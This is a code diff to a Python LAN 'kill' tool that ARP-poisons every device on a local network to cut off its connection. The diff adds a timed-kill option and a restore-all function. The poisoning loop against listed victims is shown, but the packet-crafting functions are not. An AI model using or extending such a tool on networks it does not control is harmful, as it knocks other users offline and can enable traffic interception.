@@ -79,6 +79,7 @@ group.add_argument(
     '-ka', help='kill all addresses in the LAN', action='store_true')
 group.add_argument(
     '-ra', help='restore all addresses', action='store_true')
+parser.add_argument('-t', help='timing of kill', metavar='second')
 parser.add_argument('-ig', help='ignore the address',
                     metavar='ip|mac', nargs='+')
 parser.add_argument('--details', help='show kill details', action='store_true')
@@ -209,29 +210,8 @@ if len(kill_list) == 0:
     print('No device to be killed, exit program')
     exit()
 
-if kill:
-    # If we have a number, loop the poison function until we get a
-    # keyboard inturrupt (ctrl-c)
-    try:
-        print('Killing')
-        while True:
-            for victim in kill_list:
-                if victim[0] in ignores or victim[1] in ignores:
-                    if args.details:
-                        print('-ignored\t{}\t{}'.format(victim[0], victim[1]))
-                    continue
-                poison(victim[0], victim[1], gateway_ip, details=args.details)
-    except KeyboardInterrupt:
-        print('Restoring')
-        for victim in kill_list:
-            if victim[0] in ignores or victim[1] in ignores:
-                if args.details:
-                    print('-ignored\t{}\t{}'.format(victim[0], victim[1]))
-                continue
-            restore(victim[0], victim[1], gateway_ip,
-                    gateway_mac, details=args.details)
-        print('\nYou\'re welcome!')
-else:
+
+def restoreAll():
     print('Restoring')
     for victim in kill_list:
         if victim[0] in ignores or victim[1] in ignores:
@@ -240,3 +220,27 @@ else:
             continue
         restore(victim[0], victim[1], gateway_ip,
                 gateway_mac, details=args.details)
+    print('\nYou\'re welcome!')
+    exit(0)
+
+
+if kill:
+    # If we have a number, loop the poison function until we get a
+    # keyboard inturrupt (ctrl-c)
+    try:
+        print('Killing')
+        start = time.time()
+        while True:
+            if(args.t and time.time() - start > int(args.t)):
+                print("Time out")
+                restoreAll()
+            for victim in kill_list:
+                if victim[0] in ignores or victim[1] in ignores:
+                    if args.details:
+                        print('-ignored\t{}\t{}'.format(victim[0], victim[1]))
+                    continue
+                poison(victim[0], victim[1], gateway_ip, details=args.details)
+    except KeyboardInterrupt:
+        restoreAll()
+else:
+    restoreAll()
